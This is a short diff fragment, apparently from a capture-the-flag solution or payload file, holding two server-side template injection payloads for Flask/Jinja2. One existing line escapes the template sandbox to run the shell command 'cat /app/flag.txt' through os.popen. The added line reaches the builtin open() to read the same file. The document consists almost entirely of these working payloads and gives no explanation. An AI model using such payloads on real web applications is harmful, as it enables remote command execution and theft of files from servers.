@@ -18,3 +18,6 @@ v2
 
 
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}
+
+
+{{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
